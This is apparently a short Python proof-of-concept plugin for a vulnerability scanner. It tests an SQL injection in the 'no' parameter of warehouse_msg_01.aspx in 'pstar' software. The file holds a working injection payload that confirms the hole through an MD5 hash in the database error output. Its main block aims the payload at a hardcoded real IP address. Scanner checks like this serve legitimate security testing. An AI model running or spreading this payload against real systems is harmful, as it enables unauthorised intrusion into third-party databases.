#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:xq17
#ref::http://www.wooyun.org/bugs/wooyun-2015-0141364

def assign(service,arg):
    if service=="pstar":
        return True,arg
    
def audit(arg):
    payload = "HyperLink/warehouse_msg_01.aspx?type=A&no="
    url=arg + payload + '%27and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
    code, head, res, errcode,finalurl =  curl.curl(url)
    if code!=0 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
        security_hole('find sql injection: ' + arg + payload)

                

if  __name__ == '__main__':
    from dummy import *
    audit(assign("pstar","http://180.166.7.114:8888/")[1])